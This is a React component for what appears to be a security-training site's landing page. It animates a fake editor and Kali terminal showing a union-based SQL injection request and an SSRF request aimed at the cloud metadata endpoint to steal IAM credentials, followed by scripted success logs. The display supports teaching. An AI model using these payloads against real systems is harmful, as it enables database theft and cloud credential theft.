import React, { useState, useEffect, useRef } from 'react';
import { Shield, Layers, Target, BookOpen, FlaskConical, Crown, X, Terminal as TerminalIcon, CheckCircle, ArrowRight, Zap } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

const AppReveal = () => {
    const navigate = useNavigate();

    // Live Hack Simulation State
    const [hackStep, setHackStep] = useState(0);
    const [sequenceIndex, setSequenceIndex] = useState(0);
    const [displayCode, setDisplayCode] = useState("");
    const [attackIndex, setAttackIndex] = useState(0);

    // 100% Kali Realism: Terminal Handshake State
    const [terminalStep, setTerminalStep] = useState(0);
    const [terminalTypedText, setTerminalTypedText] = useState("");
    const [terminalLogs, setTerminalLogs] = useState([]);
    const terminalBodyRef = useRef(null);

    // Gentle auto-scroll — nudge down by ~15% instead of jumping to absolute bottom
    useEffect(() => {
        if (terminalBodyRef.current) {
            const el = terminalBodyRef.current;
            const scrollAmount = el.clientHeight * 0.15;
            const scrollTimeout = setTimeout(() => {
                el.scrollBy({ top: scrollAmount, behavior: 'smooth' });
            }, 50);
            return () => clearTimeout(scrollTimeout);
        }
    }, [terminalLogs, terminalTypedText, hackStep]);

    const attacks = [
        {
            url: "bugora.app/lessons/advanced-sql-discovery",
            keystrokes: "import requests\n\n# Probing for Union-based SQLi\ntarget = \"http://api.target.com/users?id=1'\"\nr = requests.get(target + \" UNION SELECT NULL,NULL,NULL,user(),database()-- -\")\nprint(r.text)",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Probing for Union-based SQLi\n", type: "comment" },
                { text: "target", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://api.target.com/users?id=1'\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".get", type: "method" },
                { text: "(target + ", type: "plain" },
                { text: "\" UNION SELECT NULL,NULL,NULL,user(),database()-- -\"", type: "string" },
                { text: ")\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.text)", type: "plain" }
            ],
            terminal: [
                { text: "[*] Initializing local environment for sqlmap-style probe...", type: "info", delay: 0.5 },
                { text: "[*] Testing socket connection to api.target.com:80", type: "info", delay: 1.5 },
                { text: "[+] Connection established. Latency: 42ms", type: "success", delay: 2.2 },
                { text: "[*] Scanning for potential injection points (4 parameters)...", type: "info", delay: 3.5 },
                { text: "[!] HTTP 500: Server error detected on 'id' param. Probing offsets...", type: "info", delay: 5.0 },
                { text: "[*] Injecting UNION-based payload (offset 4,5,6)...", type: "info", delay: 6.5 },
                { text: "[!] SUCCESS: Data stream extracted from 'users' table.", type: "success", delay: 8.0 },
                { text: "[*] Parsing database metadata and user tables...", type: "info", delay: 9.0 },
                { text: "[+] DB: 'vault_prod' | User: 'root@localhost' leak confirmed.", type: "success", delay: 10.5 }
            ],
            summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
        },
        {
            url: "bugora.app/lessons/ssrf-iam-pillage",
            keystrokes: "import requests\n\n# Escalating SSRF to IAM Exfiltration\nm_url = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"\nr = requests.post(\"http://svc.internal-proxy/v1\", json={\"forward\": m_url})\nprint(r.json())",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Escalating SSRF to IAM Exfiltration\n", type: "comment" },
                { text: "m_url", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".post", type: "method" },
                { text: "(\"http://svc.internal-proxy/v1\", json={", type: "plain" },
                { text: "\"forward\"", type: "string" },
                { text: ": m_url})\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.json())", type: "plain" }
            ],
            terminal: [
                { text: "[*] Pre-flight: Verifying server-side listener on port :v1", type: "info", delay: 0.8 },
                { text: "[*] Routing through internal service proxy...", type: "info", delay: 1.8 },
                { text: "[+] Proxy tunnel established at 10.0.42.12", type: "success", delay: 2.5 },
                { text: "[*] Probing cloud metadata endpoint (169.254.169.254)...", type: "info", delay: 4.0 },
                { text: "[*] Extracting IAM credentials from metadata API...", type: "info", delay: 5.5 },
                { text: "[!] CRITICAL: Credentials found for production-role!", type: "success", delay: 7.0 },
                { text: "[+] AccessKeyId: ASIA... | SecretAccessKey: [REDACTED]", type: "success", delay: 8.5 },
                { text: "[+] SessionToken: FwoGZXIvYXdz... (Valid: 3600s)", type: "success", delay: 9.8 },
                { text: "[*] Session successfully hijacked. Persistence established.", type: "info", delay: 11.2 }
            ],
            summary: "SSRF exploit bypassed proxy layers to exfiltrate IAM role 'web-app-production-role' credentials. Session hijack completed."
        }
    ];

    const currentAttack = attacks[attackIndex];

    useEffect(() => {
        let timeout;

        // --- 1. Code Editor Typing Phase ---
        if (hackStep === 0) {
            if (sequenceIndex < currentAttack.keystrokes.length) {
                const char = currentAttack.keystrokes[sequenceIndex];
                const delay = Math.random() * 40 + 30; // High speed but smooth
                timeout = setTimeout(() => {
                    setDisplayCode(prev => prev + char);
                    setSequenceIndex(prev => prev + 1);
                }, delay);
            } else {
                // Done typing code: transition to terminal handshake
                timeout = setTimeout(() => setHackStep(1), 800);
            }
        }

        // --- 2. Terminal Handshake Phase ---
        else if (hackStep === 1) {
            const commands = ["cd labs", "ls -la", "python3 payload.py"];
            const currentCmd = commands[terminalStep];

            if (terminalTypedText.length < currentCmd.length) {
                // Type the command
                const char = currentCmd[terminalTypedText.length];
                timeout = setTimeout(() => {
                    setTerminalTypedText(prev => prev + char);
                }, 60);
            } else {
                // Finish command - hold then "Enter"
                timeout = setTimeout(() => {
                    if (terminalStep === 0) {
                        setTerminalLogs(prev => [...prev, { text: `cd labs`, type: "command", dir: "~" }]);
                        setTerminalStep(1);
                        setTerminalTypedText("");
                    } else if (terminalStep === 1) {
                        setTerminalLogs(prev => [
                            ...prev,
                            { text: `ls -la`, type: "command", dir: "~/labs" },
                            { text: "total 24K\ndrwxr-xr-x 2 root root 4.0K Feb 5 23:55 .\ndrwxr-xr-x 4 root root 4.0K Feb 5 23:54 ..\n-rw-r--r-- 1 root root  827 Feb 5 23:56 payload.py\n-rw-r--r-- 1 root root  142 Feb 5 23:56 .env", type: "info" }
                        ]);
                        setTerminalStep(2);
                        setTerminalTypedText("");
                    } else if (terminalStep === 2) {
                        setTerminalLogs(prev => [...prev, { text: `python3 payload.py`, type: "command", dir: "~/labs" }]);
                        // Final command done: transition to execution phase
                        setHackStep(2);
                    }
                }, 600);
            }
        }

        // --- 3. Execution Phase (Logs appearing) ---
        else if (hackStep === 2) {
            timeout = setTimeout(() => setHackStep(3), 6500);
        }

        return () => clearTimeout(timeout);
    }, [sequenceIndex, hackStep, terminalStep, terminalTypedText, currentAttack, attackIndex]);

    const nextAttack = () => {
        if (attackIndex < attacks.length - 1) {
            setAttackIndex(prev => prev + 1);
            setSequenceIndex(0);
            setDisplayCode("");
            setHackStep(0);
            setTerminalStep(0);
            setTerminalTypedText("");
            setTerminalLogs([]);
        } else {
            navigate('/challenges');
        }
    };

    const resetSimulation = () => {
        setSequenceIndex(0);
        setDisplayCode("");
        setHackStep(0);
        setAttackIndex(0);
        setTerminalStep(0);
        setTerminalTypedText("");
        setTerminalLogs([]);
    };

    const renderCode = () => {
        let remainingDisplay = displayCode;

        return currentAttack.tokens.map((token, index) => {
            if (remainingDisplay.length === 0) return null;

            const tokenLen = token.text.length;
            const content = remainingDisplay.slice(0, tokenLen);
            remainingDisplay = remainingDisplay.slice(tokenLen);

            return (
                <span key={`${attackIndex}-${index}`} className={`c-${token.type}`}>
                    {content}
                </span>
            );
        });
    };

    return (
        <section className="app-reveal">
            <div className="landing-container">
                <div className="reveal-wrapper animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                    <div className="reveal-glass">
                        {/* Browser Header */}
                        <div className="reveal-header">
                            <div className="header-controls">
                                <div className="dot red"></div>
                                <div className="dot yellow"></div>
                                <div className="dot green"></div>
                            </div>
                            <div className="header-address-bar">
                                <Shield size={12} className="lock-icon" />
                                <span className="protocol">https://</span>
                                <span className="domain">{currentAttack.url.split('/')[0]}</span>
                                <span className="path">/{currentAttack.url.split('/').slice(1).join('/')}</span>
                            </div>
                        </div>

                        <div className="reveal-body">
                            <div className="reveal-app-layout">
                                {/* Sidebar */}
                                <div className="reveal-sidebar">
                                    <div className="sidebar-group">
                                        <div className="sidebar-icon active" title="Explorer"><Layers size={22} /></div>
                                        <div className="sidebar-icon" title="Search"><Target size={22} /></div>
                                        <div className="sidebar-icon" title="Source Control"><BookOpen size={22} /></div>
                                    </div>
                                    <div className="sidebar-group bottom">
                                        <div className="sidebar-icon" title="Extensions"><FlaskConical size={22} /></div>
                                        <div className="sidebar-icon" title="Profile"><Crown size={22} /></div>
                                    </div>
                                </div>

                                <div className="reveal-main">
                                    <div className="simulation-container">
                                        {/* Code Editor Header */}
                                        <div className="editor-header-tabs">
                                            <div className="tab active">
                                                <span className="file-icon python">py</span>
                                                <span className="tab-name">payload.py</span>
                                                <X size={10} className="close-x" />
                                            </div>
                                            <div className="tab">
                                                <span className="file-icon">txt</span>
                                                <span className="tab-name">log.txt</span>
                                            </div>
                                            {hackStep === 1 && (
                                                <div className="editor-status-badge running animate-pulse">
                                                    <span className="desktop-text">Running script...</span>
                                                    <span className="mobile-text">Executing...</span>
                                                </div>
                                            )}
                                        </div>

                                        {/* Code Editor Body */}
                                        <div className="editor-content">
                                            <div className="line-numbers">
                                                {[1, 2, 3, 4, 5, 6, 7, 8].map(n => <div key={n}>{n}</div>)}
                                            </div>
                                            <div className="code-area">
                                                <pre>{renderCode()}<span className="cursor-block"></span></pre>
                                            </div>
                                        </div>

                                        {/* Terminal Output */}
                                        <div className={`terminal-drawer ${hackStep >= 1 ? 'open' : ''}`}>
                                            <div className="terminal-header">
                                                <div className="term-tabs">
                                                    <span className="term-tab active">TERMINAL</span>
                                                    <span className="term-tab">OUTPUT</span>
                                                    <span className="term-tab">DEBUG</span>
                                                </div>
                                            </div>
                                            <div className="terminal-body" ref={terminalBodyRef}>
                                                {/* Handshake: Executed Commands History */}
                                                {terminalLogs.map((log, i) => (
                                                    <div key={`log-${i}`} className={`term-line ${log.type}`}>
                                                        {log.type === 'command' ? (
                                                            <div className="prompt-wrapper">
                                                                <span className="prompt-user">root@kali</span>
                                                                <span className="prompt-sep">:</span>
                                                                <span className="prompt-dir">{log.dir || '~'}</span>
                                                                <span className="prompt-char">#</span>
                                                                <span className="typed-text ml-2">{log.text}</span>
                                                            </div>
                                                        ) : (
                                                            <div className="pre-output">{log.text}</div>
                                                        )}
                                                    </div>
                                                ))}

                                                {/* Active Typing Handshake */}
                                                {hackStep === 1 && (
                                                    <div className="term-line command">
                                                        <span className="prompt-user">root@kali</span>
                                                        <span className="prompt-sep">:</span>
                                                        <span className="prompt-dir">
                                                            {terminalStep === 0 ? '~' : '~/labs'}
                                                        </span>
                                                        <span className="prompt-char">#</span>
                                                        <span className="typed-text ml-2">
                                                            {terminalTypedText}
                                                            <span className="terminal-cursor"></span>
                                                        </span>
                                                    </div>
                                                )}

                                                {/* Main Hacking Execution Logs */}
                                                {hackStep >= 2 && currentAttack.terminal.map((line, i) => (
                                                    <div key={`hack-log-${i}`} className={`term-line ${line.type} animate-type`} style={{ animationDelay: `${line.delay}s` }}>
                                                        {line.text}
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Victory Modal — positioned at reveal-body level for full coverage */}
                            {hackStep >= 3 && (
                                <div className="simulation-modal-overlay">
                                    <div className="victory-modal animate-pop-in">
                                        <div className="victory-glow"></div>
                                        <div className="victory-icon-wrapper">
                                            <div className="victory-ring"></div>
                                            <CheckCircle size={36} className="victory-icon" />
                                        </div>

                                        <h3 className="victory-title">
                                            {attackIndex === 0 ? "Vulnerability Found" : "System Compromised"}
                                        </h3>

                                        {/* Attack Result Terminal UI */}
                                        <div className="modal-result-terminal">
                                            <div className="mt-header">
                                                <TerminalIcon size={12} />
                                                <span>Execution Result - payload.py</span>
                                            </div>
                                            <div className="mt-body">
                                                <div className="mt-line success">
                                                    {currentAttack.summary}
                                                </div>
                                                <div className="mt-line cursor">_</div>
                                            </div>
                                        </div>

                                        <div className="xp-gain">
                                            <span className="plus">+</span>{attackIndex === 0 ? "50" : "150"} <span className="unit">XP</span>
                                        </div>

                                        <button
                                            className="btn-victory-primary"
                                            onClick={nextAttack}
                                        >
                                            {attackIndex === 0 ? (
                                                <>Next Phase <ArrowRight size={16} /></>
                                            ) : (
                                                <><Zap size={16} fill="currentColor" /> Access Real Lab</>
                                            )}
                                        </button>
                                        <button className="btn-victory-text" onClick={resetSimulation}>
                                            Reset Lab
                                        </button>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className="floating-stat s1">
                        <Layers size={14} /> 50+ Real Labs
                    </div>
                </div>
            </div>
        </section>
    );
};

export default AppReveal;
